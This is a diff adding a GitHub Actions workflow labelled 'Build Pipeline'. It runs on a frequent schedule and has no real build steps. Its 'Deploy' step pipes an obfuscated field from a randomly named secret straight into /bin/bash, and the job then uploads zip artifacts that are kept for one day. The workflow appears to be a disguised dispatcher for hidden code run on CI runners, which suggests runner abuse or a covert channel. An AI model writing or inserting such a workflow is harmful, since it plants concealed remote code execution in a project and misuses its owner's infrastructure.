@@ -1,0 +1,29 @@
+name: Build Pipeline
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '27 3,9,15,21 * * *'
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  dispatcher:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - uses: actions/checkout@v4
+      - name: Deploy
+        env:
+          igat4792: ${{ secrets.igat4792 }}
+        run: |
+          printf '%s' "$igat4792" | jq -r .ti13613 | /bin/bash
+          printf '%s' "$swd24420" | jq -r .jiryo9 | /bin/bash
+
+      - name: Save results
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: nurQYKvv
+          path: "*.zip"
+          retention-days: 1
